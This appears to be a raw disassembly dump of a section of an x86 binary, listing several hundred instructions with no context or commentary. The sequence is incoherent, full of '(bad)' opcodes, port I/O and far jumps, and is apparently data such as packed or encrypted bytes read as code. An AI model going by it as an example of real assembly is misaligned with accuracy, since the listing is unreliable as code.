  41209c:	or     dh,BYTE PTR [eax-0x7cbff943]
  4120a2:	bound  eax,QWORD PTR [eax+0x2c]
  4120a5:	mov    dl,bh
  4120a7:	push   0xffffff95
  4120a9:	dec    edx
  4120aa:	mov    ah,0x19
  4120ac:	add    al,0x49
  4120ae:	dec    esi
  4120af:	add    eax,0x7d6335f0
  4120b4:	ret    
  4120b5:	xchg   ecx,eax
  4120b6:	jle    0x4120a5
  4120b8:	push   es
  4120b9:	fst    st(0)
  4120bb:	es jno 0x41204c
  4120be:	idiv   BYTE PTR [eax+0x5e37c7a]
  4120c4:	jmp    0x9ab1:0xc1a0962b
  4120cb:	out    0xe4,eax
  4120cd:	addr16 js 0x4120c9
  4120d0:	or     al,BYTE PTR [ebx+0x5c]
  4120d3:	lods   eax,DWORD PTR ds:[esi]
  4120d4:	fstp   QWORD PTR [ebx+ebx*4-0x28]
  4120d8:	nop
  4120d9:	cmc    
  4120da:	inc    esi
  4120db:	lods   eax,DWORD PTR ds:[esi]
  4120dc:	(bad)  
  4120dd:	shl    DWORD PTR [esp+esi*4+0x4564022e],1
  4120e4:	jns    0x412117
  4120e6:	int    0x4f
  4120e8:	push   esp
  4120e9:	xchg   esi,eax
  4120ea:	mov    edi,0xee2aad7f
  4120ef:	push   edx
  4120f0:	push   esp
  4120f1:	sub    dh,0xed
  4120f4:	dec    ecx
  4120f5:	xor    esp,DWORD PTR [edx-0x6e88beca]
  4120fb:	jl     0x4120d4
  4120fd:	out    dx,eax
  4120fe:	mov    DWORD PTR [ebx],esi
  412100:	cli    
  412101:	sbb    BYTE PTR [edx],ah
  412103:	pusha  
  412104:	mov    cl,0xd7
  412106:	add    DWORD PTR [edi-0x66ccad55],ebx
  41210c:	xor    BYTE PTR [ebx],0x5e
  41210f:	fidivr WORD PTR [edx+0x2e]
  412112:	sahf   
  412113:	sbb    al,0x88
  412115:	mul    DWORD PTR [edi+ebp*8]
  412118:	xor    BYTE PTR [ebx],cl
  41211a:	(bad)  
  41211b:	cdq    
  41211c:	dec    DWORD PTR [edi+0x7780d5]
  412122:	push   edx
  412123:	dec    ecx
  412124:	ja     0x41214e
  412126:	push   0xce4760c3
  41212b:	adc    esp,0xc0e740c2
  412131:	clc    
  412132:	pop    ebp
  412133:	inc    esi
  412134:	icebp  
  412135:	mov    ebx,0xc80bd476
  41213a:	pop    esi
  41213b:	in     eax,0x39
  41213d:	push   0xf5e5d791
  412142:	jne    0x412166
  412144:	adc    cl,BYTE PTR [ebx]
  412146:	mov    ebx,0x4c2dde93
  41214b:	cmp    BYTE PTR [edx],0x57
  41214e:	dec    edx
  41214f:	xchg   edx,eax
  412150:	in     eax,dx
  412151:	adc    eax,0x91e2be5c
  412156:	xchg   ebp,eax
  412157:	mov    ch,0xc6
  412159:	or     ecx,DWORD PTR [esi]
  41215b:	jae    0x4120ee
  41215d:	aas    
  41215e:	sbb    al,0x5e
  412160:	or     eax,DWORD PTR [esi+eax*1+0x69cf8a72]
  412167:	jnp    0x412147
  412169:	and    BYTE PTR [edx+0xb6484a0],ch
  41216f:	ret    
  412170:	pop    ss
  412171:	mov    ch,0x66
  412173:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412174:	out    dx,eax
  412175:	in     eax,0xc9
  412177:	lods   eax,DWORD PTR ds:[esi]
  412178:	mov    eax,0xd60d939e
  41217d:	jecxz  0x4121b0
  41217f:	push   0x1c
  412181:	mov    edi,DWORD PTR [ebp-0x28059b48]
  412187:	pop    es
  412188:	mov    WORD PTR [ebp+0x11],ds
  41218b:	lock int 0x9f
  41218e:	ror    esi,1
  412190:	ins    BYTE PTR es:[edi],dx
  412191:	and    eax,0xe9ccffc7
  412196:	jnp    0x412185
  412198:	std    
  412199:	mov    esi,0x34f1210f
  41219e:	xor    al,0x8b
  4121a0:	add    edi,DWORD PTR [eax+edx*1]
  4121a3:	mov    ds,WORD PTR [edx+0x4f4934d4]
  4121a9:	out    dx,eax
  4121aa:	daa    
  4121ab:	xor    al,0x19
  4121ae:	sbb    eax,0x2f173cfd
  4121b3:	ret    
  4121b4:	xchg   ebx,eax
  4121b5:	shr    DWORD PTR [ebx],0x41
  4121b8:	aas    
  4121b9:	pop    ebx
  4121ba:	clc    
  4121bb:	or     DWORD PTR [ebx],0xffffff83
  4121be:	enter  0xaaa5,0xeb
  4121c2:	jle    0x412158
  4121c4:	call   0x3ce:0x62274680
  4121cb:	stos   BYTE PTR es:[edi],al
  4121cc:	jle    0x4121a0
  4121ce:	fwait
  4121cf:	jg     0x41222f
  4121d1:	(bad)  
  4121d2:	and    esp,DWORD PTR [eax-0x80]
  4121d5:	outs   dx,BYTE PTR ds:[esi]
  4121d6:	adc    dh,BYTE PTR [edi+0x651213a]
  4121dc:	push   ss
  4121dd:	je     0x412220
  4121df:	rcl    BYTE PTR [edi],1
  4121e1:	pop    esp
  4121e2:	mov    edi,DWORD PTR [edx+0x7ad628e8]
  4121e8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4121e9:	int    0x5f
  4121eb:	pusha  
  4121ec:	in     eax,0xd1
  4121ee:	jle    0x41224c
  4121f0:	sbb    ah,0xd6
  4121f3:	xor    eax,0x4b63fcff
  4121f8:	sti    
  4121f9:	pop    esp
  4121fa:	and    eax,0x8d3232ba
  4121ff:	sbb    eax,0x9f092916
  412204:	mov    BYTE PTR [edx],dl
  412206:	push   ebx
  412207:	(bad)  
  412208:	jmp    0x83936f9b
  41220d:	mov    bh,0x8a
  41220f:	mov    bl,0x7d
  412211:	hlt    
  412212:	pop    edx
  412213:	xor    eax,DWORD PTR [edi+edi*1]
  412216:	push   cs
  412217:	cmp    al,0xc7
  412219:	jnp    0x4121de
  41221b:	mov    ch,0x9c
  41221d:	sub    al,0x29
  41221f:	pop    ds
  412220:	push   es
  412221:	imul   esi,DWORD PTR [eax+0x50],0x7ced3756
  412228:	mov    ebp,0xe9541918
  41222d:	push   eax
  41222e:	xchg   esi,eax
  41222f:	push   edx
  412230:	push   ebp
  412231:	push   ebx
  412232:	push   0xffffff8f
  412234:	or     DWORD PTR [eax],edx
  412236:	imul   ecx
  412238:	les    ebx,FWORD PTR [esp+eax*8+0x13]
  41223c:	dec    ebp
  41223d:	mov    al,ds:0x199923d4
  412242:	jp     0x41229e
  412244:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412245:	out    0x3d,al
  412247:	pop    ebp
  412248:	jmp    0x412240
  41224a:	test   ch,ch
  41224c:	sbb    bl,BYTE PTR [esi+0x1209b060]
  412252:	pusha  
  412253:	mov    ah,0x3b
  412255:	mov    ah,0x77
  412257:	xchg   ebx,eax
  412258:	xor    eax,0xf26d77c0
  41225d:	pusha  
  41225e:	jnp    0x4122a5
  412260:	xchg   BYTE PTR [edi],bh
  412262:	imul   esi,DWORD PTR [ecx+0x5fa5f034],0x9c6f1602
  41226c:	fsub   QWORD PTR [ecx+0x3e4cbf86]
  412272:	jle    0x4122e1
  412274:	fst    QWORD PTR [eax-0x6dbebbed]
  41227a:	jae    0x41229f
  41227c:	xchg   BYTE PTR [ecx],ch
  41227e:	mov    ecx,0xd9a709ff
  412283:	out    0x46,al
  412285:	(bad)  
  412286:	fild   DWORD PTR [ebp+0x420a26a3]
  41228c:	inc    edi
  41228d:	dec    ecx
  41228e:	push   esi
  41228f:	pop    esp
  412290:	pop    ds
  412291:	scas   al,BYTE PTR es:[edi]
  412292:	sbb    al,0x40
  412294:	aaa    
  412295:	repz jo 0x41230f
  412298:	popf   
  412299:	iret   
  41229a:	in     eax,0xe3
  41229c:	mov    bh,0xc8
  41229e:	adc    eax,0x64a29585
  4122a3:	xor    eax,0xe9e0093
  4122a8:	mov    cs,WORD PTR [ebx+0x304aeec1]
  4122ae:	adc    dl,BYTE PTR [esi+edx*2-0x5baf485c]
  4122b5:	aad    0x38
  4122b7:	test   eax,0x8a4acea2
  4122bc:	jmp    0x837d:0xc36a107c
  4122c3:	sbb    esp,DWORD PTR [eax-0x31]
  4122c6:	ins    BYTE PTR es:[edi],dx
  4122c7:	add    BYTE PTR [edi-0x6fe240d3],cl
  4122cd:	jmp    0x42ea:0xa00391f8
  4122d4:	scas   al,BYTE PTR es:[edi]
  4122d5:	test   BYTE PTR [ebp-0x497c0897],ah
  4122db:	test   al,0x53
  4122dd:	or     dl,bh
  4122df:	outs   dx,BYTE PTR ds:[esi]
  4122e0:	dec    ecx
  4122e1:	fisubr WORD PTR [eax-0xc]
  4122e4:	dec    ecx
  4122e5:	icebp  
  4122e6:	call   0xfed50c1d
  4122eb:	adc    DWORD PTR [eax-0x6a685c78],eax
  4122f1:	xchg   edi,eax
  4122f2:	pop    ebx
  4122f3:	in     al,0x7f
  4122f5:	ss add ebx,0xc2c0d30f
  4122fc:	addr16 pop es
  4122fe:	nop
  4122ff:	(bad)  
  412300:	loopne 0x412373
  412302:	addr16 jl 0x412307
  412305:	fwait
  412306:	call   0x24c9ccc4
  41230b:	js     0x4122a8
  41230d:	inc    ebp
  41230e:	mov    BYTE PTR ds:0x1a949f08,ch
  412314:	mov    al,0xfe
  412316:	(bad)  [ebp-0x4b]
  412319:	loopne 0x412358
  41231b:	(bad)  [eax-0x90700a6]
  412321:	into   
  412322:	cmc    
  412323:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412324:	adc    BYTE PTR [esi-0x1e],cl
  412327:	sti    
  412328:	lods   eax,DWORD PTR ds:[esi]
  412329:	cmp    bh,BYTE PTR [edx+0x7c]
  41232c:	lea    ecx,[ecx+0x7ff34282]
  412332:	xor    BYTE PTR [edi-0x26],ah
  412335:	fcom   DWORD PTR [ebx]
  412337:	pop    ss
  412338:	and    dh,al
  41233a:	icebp  
  41233b:	mov    dh,0xe
  41233d:	mov    edx,0x9c937a87
  412342:	es inc esp
  412344:	mov    esi,DWORD PTR [edx+0x6111845d]
  41234a:	dec    ebp
  41234b:	xchg   ebx,eax
  41234c:	mov    edi,0xa796f48
  412351:	xor    eax,0x26ad8c64
  412356:	dec    edi
  412357:	bound  esi,QWORD PTR [ebp+0xdefeadc]
  41235d:	shr    DWORD PTR [esi],cl
  41235f:	sbb    BYTE PTR [edx],0xe7
  412362:	mov    bl,0x80
  412364:	adc    al,0x4
  412366:	inc    esp
  412367:	mov    bh,0xdd
  412369:	ins    BYTE PTR es:[edi],dx
  41236a:	push   0x7a
  41236c:	push   ebp
  41236d:	mov    cl,ah
  41236f:	inc    ebp
  412371:	scas   eax,DWORD PTR es:[edi]
  412372:	hlt    
  412373:	or     DWORD PTR [edi+0x3961a1b5],eax
  412379:	sbb    eax,0x7fd8bd3
  41237e:	dec    ebx
  41237f:	xchg   ebx,eax
  412380:	popa   
  412381:	inc    esi
  412382:	or     DWORD PTR fs:[ebp+0x488da816],eax
  412389:	push   0xffffffe8
  41238b:	out    0xfd,al
  41238d:	pop    esi
  41238e:	pop    ecx
  41238f:	push   edx
  412390:	ja     0x41235c
  412392:	(bad)  
  412393:	adc    dh,BYTE PTR [esi+0x7e]
  412396:	test   BYTE PTR ds:0x7b7f0229,al
  41239c:	or     al,0x84
  41239e:	jmp    0x8095eff9
  4123a3:	pusha  
  4123a4:	sub    eax,0xef989559
  4123a9:	add    BYTE PTR [ebp-0x6e5d5b0b],dh
  4123af:	mov    eax,0x31c4c0a0
  4123b4:	push   ds
  4123b5:	sub    eax,0xf22c1067
  4123ba:	add    dh,BYTE PTR [ebp+0x6c]
  4123bd:	test   BYTE PTR [eax-0x787ef3e2],dl
  4123c3:	add    bl,ch
  4123c5:	cmp    al,0x6
  4123c7:	aad    0x8e
  4123c9:	(bad)  
  4123ca:	push   es
  4123cb:	loop   0x412422
  4123cd:	test   DWORD PTR [ebx],0xb7d83047
  4123d3:	xchg   edx,eax
  4123d4:	cld    
  4123d5:	sub    DWORD PTR [eax-0x487742c0],0xffffffb9
  4123dc:	sahf   
  4123dd:	push   esp
  4123de:	inc    edx
  4123df:	out    dx,eax
  4123e0:	(bad)  
  4123e1:	or     BYTE PTR [ebx+edi*2],ch
  4123e4:	rcr    DWORD PTR [ebx-0x5e],1
  4123e7:	leave  
  4123e8:	dec    edx
  4123e9:	cmc    
  4123ea:	mov    edx,0x88441a5c
  4123ef:	test   BYTE PTR [ecx],bh
  4123f1:	cwde   
  4123f2:	mov    ebx,esi
  4123f4:	aad    0x9b
  4123f6:	xchg   edi,eax
  4123f7:	pusha  
  4123f8:	mov    ds:0xe4ef166d,al
  4123fd:	xchg   edi,eax
  4123fe:	jbe    0x4123e4
  412400:	out    0x17,al
  412402:	xor    ch,BYTE PTR [ebx-0xa1e8b60]
  412408:	jecxz  0x41245d
  41240a:	in     al,dx
  41240b:	push   ebp
  41240c:	and    ch,dh
  41240e:	retf   
  41240f:	or     bh,BYTE PTR [ebx-0x155da016]
  412415:	out    dx,al
  412416:	pop    ecx
  412417:	loop   0x4123b5
  412419:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41241a:	mov    dh,0x75
  41241c:	mov    ebx,0x7131ea
  412421:	out    0xd9,eax
  412423:	push   ss
  412424:	retf   
  412425:	int3   
  412426:	or     BYTE PTR [esi-0x6e4a78e2],0x8b
  41242d:	jecxz  0x412468
  41242f:	push   edi
  412430:	aas    
  412431:	sub    al,0xb5
  412433:	push   edx
  412434:	std    
  412435:	inc    ebx
  412436:	sbb    DWORD PTR [ecx+0x46],ebp
  412439:	adc    BYTE PTR [eax-0xd],0xd2
  41243d:	cdq    
  41243e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41243f:	or     bl,al
  412441:	add    eax,0x5e7bce9a
  412446:	mov    ebp,0xf7ddb28f
  41244b:	inc    esi
  41244c:	ret    
  41244d:	scas   al,BYTE PTR es:[edi]
  41244e:	outs   dx,DWORD PTR ss:[esi]
  412450:	popa   
  412451:	inc    esi
  412452:	(bad)  
  412453:	stc    
  412454:	(bad)  
  412455:	js     0x41247b
  412457:	in     eax,dx
  412458:	and    al,0xb
  41245a:	mov    DWORD PTR [esi],eax
  41245c:	popa   
  41245d:	(bad)  
  41245e:	mov    ah,0xae
  412460:	xor    BYTE PTR [ebx+ebx*1+0x72],0xcd
  412465:	enter  0xc57d,0xde
  412469:	je     0x41244a
  41246b:	mov    ch,0x83
  41246d:	mov    eax,ds:0xac7afb09
  412472:	shr    BYTE PTR ds:0x2609478f,0xca
  412479:	pop    ds
  41247a:	imul   esp,DWORD PTR [edx],0x1a
  41247d:	cmp    bh,ah
  41247f:	xor    eax,0x303b3a2c
  412484:	adc    DWORD PTR [ebx+ecx*1-0x16],ebp
  412488:	das    
  412489:	pop    ss
  41248a:	daa    
  41248b:	sbb    eax,0x3ebae0e4
  412490:	lods   al,BYTE PTR ds:[esi]
  412491:	bound  edx,QWORD PTR [ebx+0x68]
  412494:	lods   al,BYTE PTR ds:[esi]
  412495:	xchg   edx,eax
  412496:	stc    
  412497:	(bad)  [edx+0x66e62bab]
  41249d:	mov    ds:0xcb33aaea,al
  4124a2:	and    ebp,ebx
  4124a4:	cmp    eax,0x530be974
  4124a9:	jecxz  0x412462
  4124ab:	scas   eax,DWORD PTR es:[edi]
  4124ac:	or     eax,0x1192a53b
  4124b1:	xchg   ebx,eax
  4124b2:	std    
  4124b3:	loop   0x41248f
  4124b5:	(bad)  
  4124b6:	sbb    DWORD PTR [edx],esi
  4124b8:	mov    eax,ds:0xfd7528e9
  4124bd:	(bad)  
  4124be:	jae    0x41246c
  4124c0:	retf   
  4124c1:	sti    
  4124c2:	bound  ecx,QWORD PTR [edx-0x7eda74d3]
  4124c8:	dec    edi
  4124c9:	mov    esi,0xbb9c2c4b
  4124ce:	jb     0x41251e
  4124d0:	inc    ecx
  4124d1:	(bad)  
  4124d2:	imul   BYTE PTR [edi-0x5be6fc0a]
  4124d8:	jmp    0x4124c4
  4124da:	in     al,0xd
  4124dc:	cmc    
  4124dd:	push   ss
  4124de:	and    DWORD PTR [edx],ebp
  4124e0:	(bad)  
  4124e1:	loope  0x41253f
  4124e3:	add    DWORD PTR [edi-0x43],ebx
  4124e6:	mov    ds:0xfc4d8649,al
  4124eb:	xor    edi,DWORD PTR [ecx+0x32f41723]
  4124f1:	(bad)  
  4124f2:	les    ecx,FWORD PTR [ecx+eax*8-0x2e]
  4124f6:	xchg   esp,eax
  4124f7:	imul   ecx,DWORD PTR [ebp-0x2c],0xce7c3755
  4124fe:	sti    
  4124ff:	adc    al,0x4e
  412501:	call   0xec7b9c8c
  412506:	sbb    DWORD PTR [eax-0x1a],0xffffffef
  41250a:	aad    0xe2
  41250c:	es popf 
  41250e:	inc    eax
  41250f:	mov    esi,0xd9aed5ef
  412514:	lods   al,BYTE PTR ds:[esi]
  412515:	fimul  DWORD PTR [edi+edi*4-0x85b421f]
  41251c:	(bad)  
  41251d:	outs   dx,BYTE PTR ds:[esi]
  41251e:	test   DWORD PTR [ecx-0x5e],eax
  412521:	call   0x229e:0x9aa56ef2
  412528:	in     eax,dx
  412529:	or     BYTE PTR ds:0xa3e8a8b5,dh
  41252f:	xchg   esp,eax
  412530:	cmp    eax,0x702d2b97
  412535:	push   ss
  412536:	mov    ah,0xce
  412538:	pop    ecx
  412539:	pushf  
  41253a:	mov    eax,0xceee594f
  41253f:	or     edx,DWORD PTR [eax]
  412541:	push   esp
  412542:	nop
  412543:	xchg   ebx,eax
  412544:	mov    edx,DWORD PTR [edi+0x7b6356e8]
  41254a:	jecxz  0x41251b
  41254c:	lods   eax,DWORD PTR ds:[esi]
  41254d:	cmp    eax,edx
  41254f:	mov    ecx,0xf9f6bd45
  412554:	int3   
  412555:	adc    edx,ebp
  412557:	adc    al,0x47
  412559:	jb     0x4124f8
  41255b:	mov    esi,0x16b6d64a
  412560:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412561:	add    ecx,DWORD PTR [eax+0x62]
  412564:	cmp    eax,0xda88759d
  412569:	xchg   ebp,eax
  41256a:	pop    esi
  41256b:	in     al,dx
  41256c:	stos   BYTE PTR es:[edi],al
  41256d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41256e:	sti    
  41256f:	rol    BYTE PTR [edi+ebx*1+0x62dec7cb],0x35
  412577:	pop    ebx
  412578:	mov    ebp,0x1354cc71
  41257d:	ins    DWORD PTR es:[edi],dx
  41257e:	mov    DWORD PTR ds:0xedceba46,0x8ae50f69
  412588:	lods   eax,DWORD PTR ds:[esi]
  412589:	sub    BYTE PTR [eax-0x3f],al
  41258c:	mov    al,ds:0xa535cade
  412591:	cmp    dh,dh
  412593:	in     al,dx
  412594:	inc    ebx
  412595:	sub    al,0x13
  412597:	xor    edx,edi
  412599:	fiadd  WORD PTR [eax-0x17]
  41259c:	shr    cl,cl
  41259e:	xor    BYTE PTR [edx-0x1c006aac],al
  4125a4:	dec    ecx
  4125a5:	pop    esp
  4125a6:	sbb    eax,0x55b06b0d
  4125ab:	xchg   bh,dh
  4125ad:	test   BYTE PTR [eax+ebp*2],dh
  4125b0:	dec    ebx
  4125b1:	sub    DWORD PTR [ecx-0x46],0xa3a51df4
  4125b8:	inc    edx
  4125b9:	jns    0x4125cf
  4125bb:	lahf   
  4125bc:	call   0xed54:0x836da5dc
  4125c3:	or     edi,edx
  4125c5:	xor    al,0x69
  4125c7:	imul   edi,DWORD PTR [edi],0x2c
  4125ca:	leave  
  4125cb:	pushaw 
  4125cd:	sub    al,0x3d
  4125cf:	add    eax,0xa399e382
  4125d4:	icebp  
  4125d5:	(bad)  
  4125d6:	fst    DWORD PTR [edi-0x75]
  4125d9:	aaa    
  4125da:	test   BYTE PTR [eax],0xcf
  4125dd:	popw   es
  4125df:	xor    DWORD PTR [bx+si+0x29c4],0xa34301e8
  4125e8:	outs   dx,BYTE PTR ds:[esi]
  4125e9:	push   0xcfe4322
  4125ee:	and    eax,0x6e138ce8
  4125f3:	or     bh,bl
  4125f5:	popa   
  4125f6:	mov    edx,0x250696fc
  4125fb:	(bad)
  4125ff:	or     bh,BYTE PTR [edi+0x61]
  412602:	and    dh,ch
  412604:	je     0x4125fb
  412606:	pop    ebx
  412607:	aad    0xc6
  412609:	aad    0x81
  41260b:	jo     0x412656
  41260d:	je     0x412666
  41260f:	jne    0x4125f6
  412611:	iret   
  412612:	nop
  412613:	std    
  412614:	das    
  412615:	(bad)  
  412616:	mov    esp,0x783928c1
  41261b:	imul   ebx,DWORD PTR [esi-0x18],0x7762763e
  412622:	sar    BYTE PTR [edi-0x1],cl
  412625:	or     BYTE PTR [ebp+0x3c68ca42],dh
  41262b:	bswap  edx
  41262d:	xchg   esp,eax
  41262e:	adc    bl,BYTE PTR [ebx+ebx*1+0x667ecda0]
  412635:	xchg   edi,eax
  412636:	ds push 0xffffffa0
  412639:	mov    eax,ds:0x99481ac2
  41263e:	(bad)  
  41263f:	loope  0x412607
  412641:	inc    edx
  412642:	(bad)
  412647:	loop   0x4126a2
  412649:	mov    edi,edx
  41264b:	cmp    eax,0x3c718f44
  412650:	push   ds
  412651:	jl     0x4125fe
  412653:	jp     0x4126c3
  412655:	fsubr  st,st(5)
  412657:	shr    ebp,1
  412659:	ret    
  41265a:	cmp    eax,0xa5a91ff0
  41265f:	jbe    0x4125ee
  412661:	jne    0x412662
  412663:	dec    eax
  412664:	xchg   edi,edi
  412666:	pop    es
  412667:	in     al,0x31
  412669:	sbb    eax,0xdb4727c4
  41266e:	xchg   edi,eax
  41266f:	ror    DWORD PTR [edx+0x5],1
  412672:	pslld  mm5,QWORD PTR [ebp+esi*8-0x4e302117]
  41267a:	fst    DWORD PTR [esi+0x4b44e42e]
  412680:	mov    eax,0x8d750e96
  412685:	outs   dx,DWORD PTR ds:[esi]
  412686:	cld    
  412687:	pop    edi
  412688:	pusha  
  412689:	or     DWORD PTR [eax],ebx
  41268b:	aaa    
  41268c:	(bad)  
  41268d:	pop    es
  41268e:	into   
  41268f:	adc    BYTE PTR [ebp-0x7a],cl
  412692:	mov    BYTE PTR [eax-0x4c],ch
  412695:	scas   eax,DWORD PTR es:[edi]
  412696:	adc    BYTE PTR [ecx+0xb],ch
  412699:	cs call 0x1fd5283e
  41269f:	adc    al,0x22
  4126a1:	sbb    cl,BYTE PTR [ecx]
  4126a3:	mov    edx,0x58b8d880
  4126a8:	loop   0x41266a
  4126aa:	push   es
  4126ab:	sub    eax,0x9e7b6232
  4126b0:	pushf  
  4126b1:	jo     0x4126e7
  4126b3:	xor    BYTE PTR [edi],cl
  4126b5:	pop    edi
  4126b6:	pop    esp
  4126b7:	(bad)  
  4126b8:	jecxz  0x4126d5
  4126ba:	dec    edi
  4126bb:	cmp    ah,ch
  4126bd:	rcr    DWORD PTR [eax-0x1923be05],0xe3
  4126c4:	les    eax,FWORD PTR [edi]
  4126c6:	mov    ds:0x4de5378f,al
  4126cb:	jle    0x412685
  4126cd:	mov    gs,WORD PTR [ecx]
  4126cf:	in     eax,0xde
  4126d1:	mov    ?,WORD PTR [ebx]
  4126d3:	aaa    
  4126d4:	adc    al,BYTE PTR [edx]
  4126d6:	pop    ss
  4126d7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4126d8:	int3   
  4126d9:	es test al,0x22
  4126dc:	cmp    BYTE PTR [ebp-0x4b],ch
  4126df:	(bad)  
  4126e0:	cmp    ch,cl
  4126e2:	arpl   WORD PTR [esi-0x12],dx
  4126e5:	push   0x1f
  4126e7:	dec    ebp
  4126e8:	daa    
  4126e9:	xchg   esi,ebp
  4126eb:	add    BYTE PTR [ebx],bl
  4126ed:	inc    ecx
  4126ee:	and    eax,0x5a3012db
  4126f3:	dec    esp
  4126f4:	or     DWORD PTR ds:[eax],ebx
  4126f7:	icebp  
  4126f8:	stc    
  4126f9:	push   esi
  4126fa:	and    BYTE PTR [edx+0x48],bh
  4126fd:	ds push cx
  412700:	push   esp
  412701:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412702:	xor    DWORD PTR [edx+0x27],0x76
  412706:	pop    edi
  412707:	ss inc ebx
  412709:	mov    ch,0x3e
  41270b:	and    edx,edx
  41270d:	pushf  
  41270e:	aad    0x96
  412710:	aas    
  412711:	mov    eax,0x6ad46141
  412716:	fstp   st(0)
  412718:	pop    es
  412719:	scas   eax,DWORD PTR es:[edi]
  41271a:	adc    DWORD PTR [esp+eax*1+0x13],ebx
  41271e:	hlt    
  41271f:	jno    0x412711
  412721:	cmp    eax,0x7b38afcb
  412726:	nop
  412727:	div    esi
  412729:	jge    0x412792
  41272b:	ins    BYTE PTR es:[edi],dx
  41272c:	leave  
  41272d:	jg     0x4126b0
  41272f:	cmp    eax,eax
  412731:	pop    edx
  412732:	aam    0x4d
  412734:	jecxz  0x4126fe
  412736:	xor    DWORD PTR [edi-0x6b],ebx
  412739:	lods   al,BYTE PTR ds:[esi]
  41273a:	xor    DWORD PTR [edx],edi
  41273c:	ss stc 
  41273e:	(bad)  
  41273f:	fcmovnu st,st(4)
  412741:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412742:	mov    esp,0x60c4d87f
  412747:	xchg   edi,eax
  412748:	inc    ebx
  412749:	shl    edi,0xcd
  41274c:	inc    eax
  41274d:	jne    0x412711
  41274f:	leave  
  412750:	mov    al,0xa2
  412752:	ss (bad) 
  412754:	loopne 0x4126f2
  412756:	pushf  
  412757:	xor    BYTE PTR [esi],cl
  412759:	jb     0x4127d4
  41275b:	push   ds
  41275c:	xchg   esp,eax
  41275d:	pop    eax
  41275e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41275f:	popa   
  412760:	out    0x4b,eax
  412762:	test   DWORD PTR [ebx+eiz*4-0x11d8eefb],edi
  412769:	or     DWORD PTR [ecx+eiz*8],0x243c7eb1
  412770:	and    eax,0xce4fd78f
  412775:	sub    ecx,DWORD PTR [ebx]
  412777:	xchg   edi,eax
  412778:	dec    eax
  412779:	ja     0x41279f
  41277b:	xchg   esi,eax
  41277c:	pop    edi
  41277d:	in     al,dx
  41277e:	inc    esi
  41277f:	xchg   ebp,eax
  412780:	jbe    0x41270e
  412782:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412783:	inc    ecx
  412784:	imul   ebp,DWORD PTR [eax-0x6a],0xffffff82
  412788:	in     al,0x41
  41278a:	xchg   DWORD PTR [ecx+eiz*8+0x5a],ecx
  41278e:	call   0x8a66c481
  412793:	cli    
  412794:	xlat   BYTE PTR ds:[ebx]
  412795:	cmp    BYTE PTR [esi+0x8],0x5d
  412799:	enter  0x721f,0xc5
  41279d:	iret   
  41279e:	(bad)  
  41279f:	mov    ds:0xa3c2e31,al
  4127a4:	pop    esi
  4127a5:	xchg   ebp,eax
  4127a6:	test   al,0x7d
  4127a8:	add    eax,0x16b72352
  4127ad:	inc    eax
  4127ae:	cmp    DWORD PTR [ebx+0x6781942a],esi
  4127b4:	in     eax,dx
  4127b5:	lods   eax,DWORD PTR ds:[esi]
  4127b6:	sub    DWORD PTR [edx+ebx*2+0x12f6ab29],esi
  4127bd:	mov    bh,0x4f
  4127bf:	fld    st(0)
  4127c1:	jns    0x412810
  4127c3:	mul    DWORD PTR [esi-0x235b95b2]
  4127c9:	lods   eax,DWORD PTR ds:[esi]
  4127ca:	sbb    ah,BYTE PTR [ebp+0x275468bf]
  4127d0:	xor    dh,BYTE PTR [edx+edi*8]
  4127d3:	dec    ebx
  4127d4:	jno    0x412790
  4127d6:	cmp    edi,esi
  4127d8:	jo     0x412811
  4127da:	inc    ecx
  4127db:	pusha  
  4127dc:	pop    ecx
  4127dd:	retf   
  4127de:	retf   0xdb05
  4127e1:	mov    ecx,0xfa5f53d4
  4127e6:	xor    cl,BYTE PTR [edi+0x7d]
  4127e9:	pop    ebp
  4127ea:	mov    BYTE PTR [edi],bh
  4127ec:	pop    eax
  4127ed:	test   eax,0x338cffe2
  4127f2:	dec    edi
  4127f3:	out    dx,al
  4127f4:	mov    ch,ch
  4127f6:	(bad)  
  4127f7:	or     eax,0xfc02c0fb
  4127fc:	xor    ebp,DWORD PTR [ebx+0x0]
  4127ff:	mov    cl,0x4f
  412801:	fcomi  st,st(3)
  412803:	div    BYTE PTR [ecx+0x2b]
  412806:	popf   
  412807:	cmp    eax,esp
  412809:	(bad)  
  41280b:	mov    edx,0xc4416046
  412810:	shl    bh,cl
  412812:	lahf   
  412813:	inc    esp
  412814:	ret    0x78f7
  412817:	dec    ebx
  412818:	shl    DWORD PTR [ecx-0x47],cl
  41281b:	mov    edx,0xd62aaabe
  412820:	mov    al,0x9e
  412822:	jmp    0x9720:0xf6497f45
  412829:	mov    ebx,0x133f3adb
  41282e:	out    dx,al
  41282f:	test   eax,0x19887496
  412834:	adc    ecx,edx
  412836:	retf   0x7e94
  412839:	push   ebp
  41283a:	cmp    ebx,DWORD PTR [eax]
  41283c:	jno    0x41280a
  41283e:	or     eax,0x9fc42f17
  412843:	cwde   
  412844:	fs daa 
  412846:	cld    
  412847:	fdivr  DWORD PTR [esp+ebp*4+0x7f76aa11]
  41284e:	sub    ebp,0x47
  412851:	mov    ah,0x61
  412853:	and    BYTE PTR [edx-0x2],cl
  412856:	mov    al,0x5a
  412858:	into   
  412859:	xor    eax,0xba3c151e
  41285e:	ret    0xfb1e
  412861:	int3   
  412862:	or     eax,0xd2c72b61
  412867:	push   ds
  412868:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412869:	fnstenv [eax+0x65cfd39a]
  41286f:	inc    esp
  412870:	xchg   esp,eax
  412871:	jecxz  0x4128e4
  412873:	out    dx,al
  412874:	jnp    0x41281d
  412876:	or     DWORD PTR [esi-0x37],eax
  412879:	lahf   
  41287a:	push   es
  41287b:	ins    BYTE PTR es:[edi],dx
  41287c:	pop    esi
  41287d:	aam    0x57
  41287f:	mov    edi,0x7c5b5ecf
